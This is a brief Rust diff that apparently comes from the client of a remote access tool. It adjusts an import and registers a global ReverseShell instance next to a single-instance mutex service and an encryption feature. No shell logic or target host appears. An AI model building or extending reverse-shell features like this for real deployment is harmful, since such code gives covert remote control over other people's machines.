@@ -13,7 +13,7 @@ pub mod service;
 pub mod handler;
 
 use tokio::{net::TcpStream, sync::oneshot, time::sleep};
-use common::async_impl::{connection::Connection, packets::*};
+use common::{connection::Connection, packets::*};
 
 use std::sync::Mutex;
 use once_cell::sync::Lazy;
@@ -22,6 +22,10 @@ use features::encryption;
 
 static MUTEX_SERVICE: Lazy<Mutex<service::mutex::MutexLock>> = Lazy::new(||
     Mutex::new(service::mutex::MutexLock::new())
+);
+
+static REVERSE_SHELL: Lazy<Mutex<features::reverse_shell::ReverseShell>> = Lazy::new(||
+    Mutex::new(features::reverse_shell::ReverseShell::new())
 );
 
 #[tokio::main(flavor = "current_thread")]
